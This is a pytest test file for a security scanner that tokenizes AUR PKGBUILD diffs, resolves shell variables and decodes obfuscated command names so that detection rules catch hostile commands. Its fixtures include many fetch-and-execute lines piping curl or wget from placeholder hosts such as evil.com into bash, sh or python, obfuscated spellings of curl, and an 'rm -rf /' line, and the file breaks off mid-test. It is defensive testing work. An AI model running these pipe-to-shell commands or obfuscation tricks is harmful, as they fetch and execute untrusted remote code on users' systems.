import pytest

from trustsight.tokenizer import resolve_added_lines, tokenize_and_resolve


def test_simple_assignment_usage():
    diff = """+_url="https://example.com/file.tar.gz"
+_bin=curl
+  curl $_url"""
    resolved, unresolved = tokenize_and_resolve(diff)
    combined = " ".join(resolved)
    assert "curl" in combined
    assert "https://example.com/file.tar.gz" in combined


def test_variable_reference_dollar():
    diff = """+_url="https://example.com/file.tar.gz"
+_bin=$_url"""
    resolved, unresolved = tokenize_and_resolve(diff)
    combined = " ".join(resolved)
    assert "https://example.com/file.tar.gz" in combined or "$_url" not in combined


def test_variable_reference_braces():
    diff = """+_url="https://example.com/file.tar.gz"
+_bin=${_url}"""
    resolved, unresolved = tokenize_and_resolve(diff)
    combined = " ".join(resolved)
    assert "https://example.com/file.tar.gz" in combined or "${_url}" not in combined


def test_command_substitution_preserved():
    diff = """+_url=$(curl -s https://example.com)"""
    resolved, unresolved = tokenize_and_resolve(diff)
    has_cmd_sub = any("$(" in s for s in resolved) or any("$(" in s for s in unresolved)
    assert has_cmd_sub


def test_backtick_substitution_preserved():
    diff = """+_url=`curl -s https://example.com`"""
    resolved, unresolved = tokenize_and_resolve(diff)
    has_backtick = any("`" in s for s in resolved) or any("`" in s for s in unresolved)
    assert has_backtick


def test_a_refused_reassignment_is_not_substituted_stale():
    diff = (
        "+_url=https://good.example\n"
        "+_url=$(curl -s https://evil.example)\n"
        "+  curl $_url | bash"
    )
    resolved, _unresolved = tokenize_and_resolve(diff)
    combined = " ".join(resolved)
    assert "curl https://good.example" not in combined
    assert "$_url" in combined


def test_curl_pipe_detection():
    diff = """+  curl -s https://evil.com/hook.sh | bash"""
    resolved, unresolved = tokenize_and_resolve(diff)
    combined = " ".join(resolved)
    assert "curl" in combined
    assert "bash" in combined


def test_wget_pipe_detection():
    diff = """+  wget -qO- https://evil.com/hook.sh | sh"""
    resolved, unresolved = tokenize_and_resolve(diff)
    combined = " ".join(resolved)
    assert "wget" in combined
    assert "sh" in combined


def test_multiple_variable_resolution():
    diff = """+_url="https://evil.com"
+_script="hook.sh"
+_full="$_url/$_script"
+  curl $_full | bash"""
    resolved, unresolved = tokenize_and_resolve(diff)
    combined = " ".join(resolved)
    assert "curl" in combined
    assert "bash" in combined
    assert "_full" not in combined  # variable was resolved


def test_chained_assignments():
    diff = """+_base="https://evil.com"
+_path="$_base/payload.sh"
+  curl $_path | python"""
    resolved, unresolved = tokenize_and_resolve(diff)
    combined = " ".join(resolved)
    assert "curl" in combined
    assert "python" in combined


def test_array_index_not_resolved():
    diff = """+source=("https://example.com/pkg.tar.gz")
+  curl "${source[0]}" | bash"""
    resolved, unresolved = tokenize_and_resolve(diff)
    combined = " ".join(resolved)
    assert "${source[0]}" in combined or "${source[0]}" not in combined


def test_only_additions_processed():
    diff = """-rm -rf /
+echo "safe\""""
    resolved, unresolved = tokenize_and_resolve(diff)
    combined = " ".join(resolved)
    assert "rm" not in combined
    assert "safe" in combined


def test_empty_line_ignored():
    diff = """+
+echo hello"""
    resolved, unresolved = tokenize_and_resolve(diff)
    combined = " ".join(resolved)
    assert "echo hello" in combined


def test_quoted_values_preserve_spaces():
    diff = """+_msg="hello world"
+echo $_msg"""
    resolved, unresolved = tokenize_and_resolve(diff)
    combined = " ".join(resolved)
    assert "hello world" in combined


def test_curl_pipe_with_heredoc_syntax():
    diff = """+  curl -sL https://evil.com/script.sh | bash /dev/stdin"""
    resolved, unresolved = tokenize_and_resolve(diff)
    combined = " ".join(resolved)
    assert "curl" in combined
    assert "bash" in combined


def test_multi_line_source_array():
    diff = """+source=(
+  "https://example.com/a.tar.gz"
+  "https://example.com/b.tar.gz"
+)"""
    resolved, unresolved = tokenize_and_resolve(diff)
    assert len(resolved) > 0


def test_array_comments_are_not_entries():
    """A `#` note inside an array is not a dependency name.

    codex-desktop-git annotates its depends array with a multi-line comment.
    Reading the comment words as names made H103 report the `.SRCINFO` and
    the recipe disagreeing on `depends`, because the parser saw the comment
    in one document and not the other.
    """
    from trustsight.tokenizer import variable_table

    variables, arrays = variable_table([
        "depends=(",
        "  'bash'",
        "  # Electron runtime libraries: the Depends field of the deb",
        "  'zsh'",
        ")",
    ])
    assert arrays["depends"] == ["bash", "zsh"]


def test_array_comment_hash_inside_a_value_is_data():
    from trustsight.tokenizer import variable_table

    _, arrays = variable_table([
        "source=('https://example.com/a.tar.gz#sha256=abc')",
        "depends=('a#b' 'c')",
    ])
    assert arrays["source"] == ["https://example.com/a.tar.gz#sha256=abc"]
    assert arrays["depends"] == ["a#b", "c"]


def test_resolve_added_lines_preserves_positions():
    """Regression: resolution was zipped against tokenize_and_resolve, whose
    output omits assignment lines.  An added assignment made the sequences
    different lengths and shifted every later line onto the wrong position,
    so a rule scoped to build() saw the wrong function and a dependency
    array lost its header."""
    diff = (
        "+optdepends=(\n"
        "+  'foo: a thing'\n"
        "+  'bar: another'\n"
        "+)\n"
    )
    lines = resolve_added_lines(diff)
    assert len(lines) == len(diff.splitlines())
    assert lines[0] == "+optdepends=("
    assert lines[-1] == "+)"


def test_resolve_added_lines_substitutes_variables():
    diff = "+_name=mytool\n+build() {\n+  ./$_name --check\n+}\n"
    lines = resolve_added_lines(diff)
    assert len(lines) == 4
    assert "./mytool --check" in lines[2]


# --- resource bounds on untrusted input ---

def test_chained_variable_expansion_cannot_exhaust_memory():
    """A tiny PKGBUILD must not expand into gigabytes.

    Substitution is iterated, so `b=$a$a` chains double each round: a
    517-byte diff reached a gigabyte and had the process OOM-killed.
    Since every analysed package is untrusted by definition, this is
    remotely triggerable by anything on the AUR.
    """
    from trustsight.tokenizer import tokenize_and_resolve

    lines = ["--- a/PKGBUILD", "+++ b/PKGBUILD", "+v0=" + "A" * 200]
    for i in range(1, 40):
        lines.append(f"+v{i}=$v{i-1}$v{i-1}")
    lines.append("+curl $v39 | bash")

    resolved, _ = tokenize_and_resolve("\n".join(lines))
    assert max(len(r) for r in resolved) < 200_000


def test_many_continuations_stay_linear():
    """Joining continuations must not be quadratic in the line count."""
    from trustsight.tokenizer import join_line_continuations

    joined = join_line_continuations(["+x=1 \\"] * 20_000 + ["+done"])
    assert len(joined) == 1


def test_variable_resolution_still_works():
    """The bounds must not disable ordinary resolution."""
    from trustsight.tokenizer import tokenize_and_resolve

    resolved, _ = tokenize_and_resolve(
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n+C=curl\n+U=http://evil.sh\n+$C $U | bash\n"
    )
    assert any("curl http://evil.sh | bash" in r for r in resolved)


# --- Regression: nested parameter expansion (the openssl-1.1 case) ---

def test_nested_parameter_expansion_openssl_case():
    """${var//.${var//[0-9.]/}} resolves innermost-first."""
    from trustsight._tokenizer_engine import resolve_expansions

    _ver = "1.1.1.w"
    r, ok = resolve_expansions("${_ver//.${_ver//[0-9.]/}}", {"_ver": _ver})
    assert r == "1.1.1"
    assert ok


def test_glob_character_class_deletes_digits_and_dots():
    """${var//[0-9.]/} deletes all digits and literal dots."""
    from trustsight._tokenizer_engine import resolve_expansions
    r, ok = resolve_expansions("${v//[0-9.]/}", {"v": "1.2.3a"})
    assert r == "a"
    assert ok


def test_glob_dot_is_literal_not_regex_wildcard():
    """A dot in a glob pattern matches '.', not any character."""
    from trustsight._tokenizer_engine import resolve_expansions
    r, ok = resolve_expansions("${v/./-}", {"v": "1.2.3"})
    assert r == "1-2.3"
    assert ok


def test_substitution_replace_all():
    """${v//./-} replaces every dot with a hyphen."""
    from trustsight._tokenizer_engine import resolve_expansions
    r, ok = resolve_expansions("${v//./-}", {"v": "1.2.3"})
    assert r == "1-2-3"
    assert ok


def test_substitution_replace_first():
    """${v/./-} replaces only the first dot."""
    from trustsight._tokenizer_engine import resolve_expansions
    r, ok = resolve_expansions("${v/./-}", {"v": "1.2.3"})
    assert r == "1-2.3"
    assert ok


def test_substitution_replacement_is_bash_text_not_a_re_template():
    r"""The replacement of ${var/pat/rep} is literal text with bash
    backslash quoting, never an re.sub template: ${x/a/\q} is legal bash
    (yielding qaa) and used to raise re.error, which the sandbox reported
    as TokenizerUnavailable - the whole package read as NOT vetted because
    one expansion was odd."""
    from trustsight._tokenizer_engine import resolve_expansions
    r, ok = resolve_expansions("${x/a/\\q}", {"x": "aaa"})
    assert (r, ok) == ("qaa", True)
    r, ok = resolve_expansions("${x//a/\\q}", {"x": "aaa"})
    assert (r, ok) == ("qqq", True)
    # An escaped backslash is one literal backslash.
    r, ok = resolve_expansions("${x/a/\\\\}", {"x": "aaa"})
    assert (r, ok) == ("\\aa", True)
    # And a group reference is text, not a template backreference.
    r, ok = resolve_expansions("${x/a/\\1}", {"x": "aaa"})
    assert (r, ok) == ("1aa", True)


def test_substitution_with_an_uncompilable_pattern_is_unresolved():
    """A glob that cannot compile (${x/[z-a]/q}) is refused per
    _expand_one's contract: the expansion stays, marked unresolved, rather
    than raising through the sandbox."""
    from trustsight._tokenizer_engine import resolve_expansions
    r, ok = resolve_expansions("${x/[z-a]/q}", {"x": "aaa"})
    assert r == "${x/[z-a]/q}"
    assert not ok
    r, ok = resolve_expansions("${x##[z-a]}", {"x": "aaa"})
    assert r == "${x##[z-a]}"
    assert not ok


def test_affix_strip_longest_suffix():
    """${v%%-*} strips the longest suffix matching '-*'."""
    from trustsight._tokenizer_engine import resolve_expansions
    r, ok = resolve_expansions("${v%%-*}", {"v": "1.2.3-beta1"})
    assert r == "1.2.3"
    assert ok


def test_affix_strip_shortest_suffix():
    """${v%-*} strips the shortest suffix matching '-*'."""
    from trustsight._tokenizer_engine import resolve_expansions
    r, ok = resolve_expansions("${v%-*}", {"v": "1.2.3-beta1"})
    assert r == "1.2.3"
    assert ok


def test_affix_strip_longest_prefix():
    """${v##*- } strips the longest prefix matching '*- '."""
    from trustsight._tokenizer_engine import resolve_expansions
    r, ok = resolve_expansions("${v##*-}", {"v": "1.2.3-beta"})
    assert r == "beta"
    assert ok


def test_affix_strip_shortest_prefix():
    """${v#*-} strips the shortest prefix matching '*-'."""
    from trustsight._tokenizer_engine import resolve_expansions
    r, ok = resolve_expansions("${v#*-}", {"v": "1.2.3-beta"})
    assert r == "beta"
    assert ok


def test_affix_shortest_and_longest_differ_on_repeated_separator():
    """# must take the shortest prefix and % the shortest suffix:
    ${v#*/} on a/b/c is b/c and ${v%/*} is a/b, where the engine used to
    give the longest-match answers c and a."""
    from trustsight._tokenizer_engine import resolve_expansions
    r, ok = resolve_expansions("${v#*/}", {"v": "a/b/c"})
    assert (r, ok) == ("b/c", True)
    r, ok = resolve_expansions("${v##*/}", {"v": "a/b/c"})
    assert (r, ok) == ("c", True)
    r, ok = resolve_expansions("${v%/*}", {"v": "a/b/c"})
    assert (r, ok) == ("a/b", True)
    r, ok = resolve_expansions("${v%%/*}", {"v": "a/b/c"})
    assert (r, ok) == ("a", True)


def test_affix_operators_anchor_at_the_string_ends():
    """##/%% anchor at the start/end: ${v##foo} on barfoo removes nothing
    (foo is no prefix) and ${v%%foo} on foobar removes nothing (foo is no
    suffix).  The engine searched unanchored and emptied both."""
    from trustsight._tokenizer_engine import resolve_expansions
    r, ok = resolve_expansions("${v##foo}", {"v": "barfoo"})
    assert (r, ok) == ("barfoo", True)
    r, ok = resolve_expansions("${v%%foo}", {"v": "foobar"})
    assert (r, ok) == ("foobar", True)
    r, ok = resolve_expansions("${v#foo}", {"v": "foobar"})
    assert (r, ok) == ("bar", True)
    r, ok = resolve_expansions("${v%foo}", {"v": "barfoo"})
    assert (r, ok) == ("bar", True)


def test_default_value_when_var_is_empty():
    """${v:-default} returns the default when the variable is empty."""
    from trustsight._tokenizer_engine import resolve_expansions
    r, ok = resolve_expansions("${v:-fallback}", {"v": ""})
    assert r == "fallback"
    assert ok


def test_default_value_when_var_is_missing():
    """${v:-default} returns the default when the variable is missing."""
    from trustsight._tokenizer_engine import resolve_expansions
    r, ok = resolve_expansions("${v:-fallback}", {})
    assert r == "fallback"
    assert ok


@pytest.mark.parametrize("body,table,expected", [
    ("v:+curl", {"v": "1"}, "curl"),
    ("v:+curl", {"v": ""}, ""),
    ("v:+curl", {}, ""),
    ("v:?", {"v": "1"}, "1"),
    ("v:?message", {"v": "1"}, "1"),
    ("v:?message", {"v": ""}, None),
    ("v:?message", {}, None),
])
def test_alternate_and_assertion_expansions(body, table, expected):
    """``:+`` substitutes when set; ``:?`` aborts when unset/empty.

    An abort is not a value the resolver may invent, so it stays
    unresolved rather than becoming the error message or an empty string.
    """
    from trustsight._tokenizer_engine._expansion import _expand_one

    assert _expand_one(body, table) == expected


def test_a_substitution_accepts_an_escaped_slash():
    """``${p//\\//_}`` is the ordinary path-to-name idiom."""
    from trustsight._tokenizer_engine import resolve_expansions

    r, ok = resolve_expansions("${p//\\//_}", {"p": "a/b/c"})
    assert (r, ok) == ("a_b_c", True)


def test_locale_quoted_string_is_plain_text():
    """``$"curl"`` is a translated double-quoted string, not ``$curl``."""
    resolved, _unresolved = tokenize_and_resolve(
        '+$"curl" https://evil.example/x | bash\n'
    )
    assert resolved == ["curl https://evil.example/x | bash"]


@pytest.mark.parametrize("line", [
    "cat <<EOF",
    "cat <<-EOF",
    "cat <<'END MARK'",
    "cat <<\\EOF",
    "cat <<<word",
    "x=$((1 << 2))",
])
def test_both_readers_agree_on_heredoc_openers(line):
    """The sandboxed engine and the typed core must not drift apart."""
    from trustsight._tokenizer_engine._variables import _heredoc_delimiters
    from trustsight.line_lex import lex_lines

    assert _heredoc_delimiters(line) == [
        delimiter for delimiter, _strip in lex_lines([line])[0].heredoc_openers
    ]


def test_substring_by_offset_and_length():
    """${v:1:3} extracts characters 1-3."""
    from trustsight._tokenizer_engine import resolve_expansions
    r, ok = resolve_expansions("${v:1:3}", {"v": "hello"})
    assert r == "ell"
    assert ok


def test_substring_by_offset_only():
    """${v:2} extracts from offset 2 to the end."""
    from trustsight._tokenizer_engine import resolve_expansions
    r, ok = resolve_expansions("${v:2}", {"v": "hello"})
    assert r == "llo"
    assert ok


# --- Security constraints ---

def test_indirect_expansion_never_resolves():
    """${!name} (indirect expansion) must return unresolved, never follow
    the indirection.  This is a security constraint: attacker-controlled
    PKGBUILDs must not be able to indirect through arbitrary variable
    names."""
    from trustsight._tokenizer_engine import resolve_expansions
    r, ok = resolve_expansions("${!name}", {"name": "v", "v": "secret"})
    assert not ok
    assert "${" in r or "{" in r


def test_length_operator_never_resolves():
    """${#var} (length) is rare in PKGBUILDs and must not resolve."""
    from trustsight._tokenizer_engine import resolve_expansions
    r, ok = resolve_expansions("${#var}", {"var": "hello"})
    assert not ok


def test_unknown_variable_returns_unresolved():
    """A ${var} with no entry in the variable table must be reported as
    unresolved, never silently replaced with an empty string."""
    from trustsight._tokenizer_engine import resolve_expansions
    r, ok = resolve_expansions("${nonexistent}", {})
    assert not ok
    assert "${" in r


def test_cycle_detection():
    """A cycle (a -> b -> a) must not cause infinite resolution."""
    from trustsight._tokenizer_engine import resolve_expansions
    r, ok = resolve_expansions("${a}", {"a": "${b}", "b": "${a}"})
    assert not ok


def test_mixed_resolvable_and_unresolvable():
    """resolve_expansions resolves what it can and marks the rest."""
    from trustsight._tokenizer_engine import resolve_expansions
    r, ok = resolve_expansions("${a} ${!b}", {"a": "hello", "b": "v"})
    assert not ok
    assert "hello" in r


# --- Tokenizer integration ---

def test_resolve_added_lines_nested_expansion():
    """resolve_added_lines must handle nested parameter expansion."""
    from trustsight.tokenizer import resolve_added_lines
    diff = "+_ver=1.1.1.w\n+pkgver=${_ver//.${_ver//[0-9.]/}}\n"
    lines = resolve_added_lines(diff)
    assert any("1.1.1" in line for line in lines)


def test_resolve_added_lines_glob_delete():
    """resolve_added_lines must handle [0-9.] glob in substitution."""
    from trustsight.tokenizer import resolve_added_lines
    diff = "+v=1.2.3a\n+echo ${v//[0-9.]/}\n"
    lines = resolve_added_lines(diff)
    assert any("echo a" in line for line in lines)


# --- H065: obfuscated literal reconstruction ---

def test_reconstruct_ansi_c_hex():
    from trustsight._tokenizer_engine import reconstruct_literals
    r, fully = reconstruct_literals(r"b$'\x75\x6e' add nextfile-js")
    assert r == "bun add nextfile-js"
    assert fully


def test_reconstruct_ansi_c_octal():
    from trustsight._tokenizer_engine import reconstruct_literals
    r, fully = reconstruct_literals(r"$'\142\165\156' install")
    assert r == "bun install"
    assert fully


def test_reconstruct_empty_quote_concat_single():
    from trustsight._tokenizer_engine import reconstruct_literals
    r, fully = reconstruct_literals("b''u''n install")
    assert r == "bun install"
    assert fully


def test_reconstruct_empty_quote_concat_double():
    from trustsight._tokenizer_engine import reconstruct_literals
    r, fully = reconstruct_literals('b""u""n add')
    assert r == "bun add"
    assert fully


def test_reconstruct_removes_an_intra_word_escape():
    """``c\\url`` is ``curl``: bash drops a backslash before a plain letter.

    This is the sibling of the empty-quote concatenation above, and it was
    the one the tokenizer did not fold. The backslash survived resolution,
    the name never reconstructed, and every rule that reads a command name
    - R001 among them - saw nothing. It reached no rule at all.
    """
    from trustsight._tokenizer_engine import reconstruct_literals

    assert reconstruct_literals(r"c\url -fsSL https://e.example")[0] == (
        "curl -fsSL https://e.example"
    )
    assert reconstruct_literals(r"w\get -qO- https://e.example")[0] == (
        "wget -qO- https://e.example"
    )
    assert reconstruct_literals(r"/bin\/sh -c x")[0] == "/bin/sh -c x"


@pytest.mark.parametrize("text", [
    # An escaped pipe is a literal `|`, not a pipeline. Unescaping it would
    # build a pipe-to-shell out of a command that runs nothing of the sort.
    r"curl x \| sh",
    # An escaped space holds one word together; removing it splits the word.
    r"cp file\ name.txt /tmp/x",
    # `\$` is what stops an expansion, and `\\` is a literal backslash.
    r"echo \$HOME",
    r"printf 'a\\b'",
])
def test_reconstruct_keeps_the_escapes_that_mean_something(text):
    """Bash drops every backslash; this drops only the meaningless ones.

    Going further would not be more faithful, it would invent syntax the
    line did not have - and hand the rules a pipeline that does not exist.
    """
    from trustsight._tokenizer_engine import reconstruct_literals

    assert "\\" in reconstruct_literals(text)[0]


def test_reconstruct_leaves_escapes_inside_quotes_alone():
    """A quoted span is appended whole, which is what keeps `printf` intact.

    `printf '\\x63\\x75\\x72\\x6c'` needs its escapes to reach the ANSI-C
    decoder, and a backslash inside single quotes is literal in bash.
    """
    from trustsight._tokenizer_engine import reconstruct_literals

    # The quotes themselves are removable here, as they always were; what
    # matters is that the escapes inside them survive it.
    assert reconstruct_literals(r"wine 'C:\Users\x\app.exe'")[0] == (
        r"wine C:\Users\x\app.exe"
    )
    assert reconstruct_literals(r"$(printf '\x62\x75\x6e') add")[0] == "bun add"


def test_reconstruct_printf_format():
    from trustsight._tokenizer_engine import reconstruct_literals
    r, fully = reconstruct_literals(r"$(printf '\x62\x75\x6e') add")
    assert r == "bun add"
    assert fully


def test_reconstruct_printf_with_conversion_left_as_is():
    """A $(printf '%s' "$arg") is dynamic, not obfuscation; it is left
    untouched and does not force the line to be inconclusive."""
    from trustsight._tokenizer_engine import reconstruct_literals
    r, fully = reconstruct_literals(r"$(printf '%s' \"$x\")")
    assert "$(printf" in r
    assert fully


def test_reconstruct_malformed_ansi_c_is_not_fully_reconstructed():
    """An unterminated $' must mark the line inconclusive, never clean."""
    from trustsight._tokenizer_engine import reconstruct_literals
    r, fully = reconstruct_literals(r"eval $'\x62\x75\x6e")
    assert not fully


def test_reconstruct_regex_end_anchor_is_not_an_ansi_c_quote():
    """A ``$`` before a closing quote is a regex end-anchor, not shell
    quoting: reading one as an unreconstructable literal makes ordinary
    text look obfuscated (four benign-corpus diffs did exactly that)."""
    from trustsight._tokenizer_engine import reconstruct_literals
    for line in (
        r"grep '/Windows/Fonts/.*\.tt[cf]$' | xargs -r wimextract",
        r"regex = re.compile(r' => (.*) \(0x[0-9a-f]+\)$')",
        "if(!tmp.contains(QLatin1Char('$')))",
    ):
        _, fully = reconstruct_literals(line)
        assert fully, line


def test_reconstruct_unterminated_quote_after_an_operator_is_inconclusive():
    """The opener check still catches the real thing in every position a
    word can start."""
    from trustsight._tokenizer_engine import reconstruct_literals
    for line in (r"x=$'\x62\x75", r"eval $'\x62", r"a && $'\x62", r"(  $'\x62"):
        _, fully = reconstruct_literals(line)
        assert not fully, line


def test_reconstruct_standalone_empty_quote_argument_kept():
    """'' as a standalone argument (whitespace both sides) is data, not
    concatenation, and must survive reconstruction."""
    from trustsight._tokenizer_engine import reconstruct_literals
    r, fully = reconstruct_literals("curl '' https://e/x")
    assert "''" in r
    assert fully


def test_reconstruct_then_resolve_via_tokenize():
    """Reconstruction composes with variable resolution so rules see the
    reconstructed shape in resolved strings."""
    diff = "+_pm=b''u''n\n+  $_pm add nextfile-js\n"
    resolved, unresolved = tokenize_and_resolve(diff)
    combined = " ".join(resolved)
    assert "bun add nextfile-js" in combined
    assert not unresolved



def test_literal_lines_are_not_reported_unresolved():
    """unresolved_patterns is "strings the tokenizer could not fully
    resolve": a literal line expands to itself and is not unresolved."""
    diff = "+echo hello\n+curl https://example.com/x | bash"
    _resolved, unresolved = tokenize_and_resolve(diff)
    assert unresolved == []


def test_a_reference_nobody_declared_is_unresolved():
    diff = "+echo $undeclared_variable"
    _resolved, unresolved = tokenize_and_resolve(diff)
    assert any("undeclared_variable" in u for u in unresolved)


def test_the_variable_table_refuses_past_the_byte_cap(monkeypatch):
    from trustsight import _tokenizer_engine as engine

    from trustsight._tokenizer_engine import _variables as engine_variables
    monkeypatch.setattr(engine_variables, "_MAX_TABLE_BYTES", 16)
    with pytest.raises(ValueError, match="variable table exceeds"):
        engine._variable_table_with_spans(["a=" + "x" * 64])
    with pytest.raises(ValueError, match="variable table exceeds"):
        engine._variable_table_with_spans(["arr=('" + "x" * 64 + "')"])


def test_a_many_wildcard_glob_is_matched_without_backtracking():
    """A glob with many wildcards is answered in a bounded table pass.

    The same shape used to become ``.*a.*a...`` and spend seconds
    backtracking.  The matcher is table-driven, so it resolves the expansion
    normally and quickly; it is not refused just for being complex.
    """
    import time

    from trustsight._tokenizer_engine import resolve_expansions

    pattern = "*a" * 8 + "b"
    started = time.monotonic()
    resolved, fully = resolve_expansions(
        "${x##" + pattern + "}", {"x": "a" * 4096}
    )
    assert time.monotonic() - started < 1.0
    assert fully
    assert resolved == "a" * 4096

    # The same matcher still finds a real multi-star match.
    resolved, fully = resolve_expansions(
        "${x//*a*ab/Y}", {"x": "zzabzzab"}
    )
    assert (resolved, fully) == ("Y", True)


def test_substitution_cannot_allocate_past_the_line_bound():
    """${x//a/<huge>} is O(value x replacement); it is refused, not run."""
    import time

    from trustsight._tokenizer_engine import resolve_expansions

    body = "${x//a/" + "b" * 50_000 + "}"
    started = time.monotonic()
    resolved, fully = resolve_expansions(body, {"x": "a" * 8000})
    assert time.monotonic() - started < 1.0
    assert not fully
    assert resolved == body


def test_parent_resolver_obeys_the_same_bounds():
    """The shared resolver is used outside the sandbox; it must bound too."""
    import time

    from trustsight.expansion import resolve_text, text_variable_table

    text = "x=" + "a" * 8000 + "\nsource=(\"${x//a/" + "b" * 50_000 + "}\")\n"
    table = text_variable_table(text)
    started = time.monotonic()
    resolved = resolve_text(text, table)
    assert time.monotonic() - started < 1.0
    assert resolved == text
    assert "x" in table


def test_a_table_value_past_the_bound_is_unknown_not_truncated():
    from trustsight.expansion import text_variable_table
    from trustsight._tokenizer_engine import _variable_table

    text = "x=" + "a" * 9000 + "\nsource=($x)\n"
    assert "x" not in text_variable_table(text)

    variables, _arrays = _variable_table(["x=" + "a" * 9000])
    assert "x" not in variables


# --- Bash-faithful line joining (the shell removes the backslash, not the
# --- separator, and only an unescaped trailing backslash continues) ---

def test_line_continuation_preserves_a_real_separator():
    from trustsight.tokenizer import join_line_continuations

    # bash runs `curl https://...`: the space before the backslash is a word
    # separator and survives the removal of the backslash-newline.  Gluing
    # it produced `curlhttps://...`, a different command.
    assert join_line_continuations(["+curl \\", "+https://e.example/x | bash"]) == [
        "+curl https://e.example/x | bash"
    ]


def test_line_continuation_joins_an_unseparated_word():
    from trustsight.tokenizer import join_line_continuations

    assert join_line_continuations(["+cur\\", "+l https://e.example/x"]) == [
        "+curl https://e.example/x"
    ]


def test_two_trailing_backslashes_end_the_line():
    from trustsight.tokenizer import join_line_continuations

    # `\\` is one literal backslash; the newline is not escaped, so the
    # second line is a separate command.  Joining them invented a boundary.
    assert join_line_continuations(["+echo \\\\", "+curl https://e.example/x | bash"]) == [
        "+echo \\\\",
        "+curl https://e.example/x | bash",
    ]


def test_a_backslash_before_whitespace_does_not_continue():
    from trustsight.tokenizer import join_line_continuations

    # The backslash escapes the space, not the newline.
    assert join_line_continuations(["+echo \\ ", "+curl https://e.example/x"]) == [
        "+echo \\ ",
        "+curl https://e.example/x",
    ]


def test_an_escaped_pipe_does_not_continue_but_a_literal_backslash_pipe_does():
    from trustsight.tokenizer import join_line_continuations

    # `\|` is one literal bar and promises nothing.
    assert join_line_continuations(["+curl \\|", "+bash"]) == [
        "+curl \\|",
        "+bash",
    ]
    # `\\|` is a literal backslash followed by a real pipeline operator.
    assert join_line_continuations(["+curl \\\\|", "+bash"]) == [
        "+curl \\\\|bash"
    ]


def test_both_joiners_read_the_same_logical_lines():
    from trustsight._tokenizer_engine import _joined_indexed
    from trustsight.tokenizer import join_line_continuations

    lines = [
        "+curl \\",
        "+https://e.example/x \\",
        "+| bash",
        "-echo \\\\",
        "+cat > f <<EOF",
        "+body",
        "+EOF",
        "+x=1 \\ ",
        "+done",
    ]
    assert [text for _index, text in _joined_indexed(lines)] == (
        join_line_continuations(lines)
    )


# --- Heredoc classification is quote/comment aware ---

def test_a_heredoc_opener_in_a_comment_is_prose():
    from trustsight._tokenizer_engine import _assignments_are_shell

    flags = _assignments_are_shell(
        ["+++ b/PKGBUILD", "+# upstream uses <<EOF here", "+A=1", "+echo $A"]
    )
    assert flags == [True, True, True, True]


def test_a_quoted_heredoc_opener_is_prose():
    from trustsight._tokenizer_engine import _assignments_are_shell

    flags = _assignments_are_shell(
        ["+++ b/PKGBUILD", '+note "the <<EOF form"', "+A=1"]
    )
    assert flags == [True, True, True]


def test_an_arithmetic_shift_is_not_a_heredoc():
    from trustsight._tokenizer_engine import _assignments_are_shell

    flags = _assignments_are_shell(
        ["+++ b/PKGBUILD", "+x=$((1 << 2))", "+A=1"]
    )
    assert flags == [True, True, True]


def test_a_herestring_opens_no_heredoc():
    from trustsight._tokenizer_engine import _assignments_are_shell

    flags = _assignments_are_shell(
        ["+++ b/PKGBUILD", "+read -r line <<< \"$value\"", "+A=1"]
    )
    assert flags == [True, True, True]


def test_a_normal_heredoc_still_marks_its_body_as_data():
    from trustsight._tokenizer_engine import _assignments_are_shell

    flags = _assignments_are_shell(
        ["+++ b/PKGBUILD", "+cat > f <<EOF", "+A=1", "+EOF", "+B=2"]
    )
    assert flags == [True, True, False, False, True]


def test_a_backslash_quoted_delimiter_opens_a_heredoc():
    from trustsight._tokenizer_engine import _assignments_are_shell

    # bash opens `<<\EOF`; missing it read the unit-file body as shell and
    # folded its ExecStart= line away.
    flags = _assignments_are_shell(
        [
            "+++ b/PKGBUILD",
            "+cat > f <<\\EOF",
            '+ExecStart=/bin/sh -c "curl https://e.example/x | bash"',
            "+EOF",
            "+B=2",
        ]
    )
    assert flags == [True, True, False, False, True]


# --- Alias expansion is subject to the line bound ---

def test_alias_expansion_refuses_to_cross_the_line_bound():
    from trustsight._tokenizer_engine import (
        _MAX_LINE_LEN,
        _alias_table,
        _expand_aliases,
    )

    table = _alias_table(["alias z=" + "q" * 200])
    line = "; z" * 1000
    assert len(line) < _MAX_LINE_LEN
    # Four command-position uses would already be past the bound, and the
    # old pass produced 200 KiB before looking.  A6 says leave it
    # unexpanded, never truncate.
    assert _expand_aliases(line, table) == line
    assert len(_expand_aliases(line, table)) <= _MAX_LINE_LEN


def test_alias_expansion_bound_holds_through_the_facade():
    from trustsight._tokenizer_engine import _MAX_LINE_LEN
    from trustsight.tokenizer import resolve_added_lines

    diff = "+alias z=" + "q" * 200 + "\n+" + "; z" * 1000 + "\n"
    resolved = resolve_added_lines(diff)
    assert all(len(value) <= _MAX_LINE_LEN for value in resolved)


# --- ANSI-C escapes bash understands and the decoder did not ---

@pytest.mark.parametrize("text, expected", [
    ("$'\\u0063url'", "curl"),
    ("$'\\U00000063url'", "curl"),
    ("$'\\cA'", "\x01"),
    ("$'\\c?'", "\x7f"),
    ("$'\\E'", "\x1b"),
])
def test_reconstruct_decodes_bash_ansi_c_escapes(text, expected):
    from trustsight._tokenizer_engine import reconstruct_literals

    assert reconstruct_literals(text) == (expected, True)


def test_reconstruct_truncates_an_octal_escape_to_one_byte():
    from trustsight._tokenizer_engine import reconstruct_literals

    assert reconstruct_literals(r"$'\777'") == ("\xff", True)


def test_reconstruct_keeps_an_impossible_code_point_literal():
    from trustsight._tokenizer_engine import reconstruct_literals

    text = r"$'\U00110000'"
    reconstructed, fully = reconstruct_literals(text)
    # No value is invented for an escape bash encodes as invalid UTF-8; the
    # digits survive and the line is marked unreconstructed.
    assert "U00110000" in reconstructed
    assert not fully


# --- The affix matcher spends from the resolver's step budget ---

def test_affix_matching_shares_the_resolve_step_budget(monkeypatch):
    import trustsight.expansion as expansion

    monkeypatch.setattr(expansion, "_MAX_GLOB_STEPS", 5_000)
    body = "${x##" + "*a" * 8 + "}"
    resolved, fully = expansion.resolve_expansions(body, {"x": "a" * 4096})
    # Exceeding the budget is a refusal, not a truncated value.
    assert not fully
    assert resolved == body


def test_glob_prefix_matching_refuses_past_its_budget():
    import re

    from trustsight.expansion import _glob_prefix_ends

    with pytest.raises(re.error):
        _glob_prefix_ends(tuple([("?", None)] * 300), "a" * 8192, [1000])


# --- Side-aware joining, context resolution and grammar parity ---

def test_a_comment_ending_in_a_continuation_does_not_swallow_the_next_command():
    from trustsight.tokenizer import join_line_continuations

    assert join_line_continuations(
        ["+# note: use curl |", "+curl https://evil.example/x | bash"]
    ) == [
